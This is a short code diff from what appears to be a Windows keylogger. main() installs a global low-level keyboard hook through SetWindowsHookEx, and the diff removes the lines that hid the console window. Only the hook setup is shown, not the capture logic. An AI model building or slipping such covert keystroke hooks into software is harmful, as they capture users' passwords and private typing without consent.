@@ -176,9 +176,6 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 
 int main()
 {
-    // Hidding console window while executing
-    ShowWindow(GetConsoleWindow(), SW_HIDE);
-
     // dwThreadId is set to 0 to make a global injection
     HHOOK hookLowLevelKeyboard = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, 0, 0);
     MSG msg;
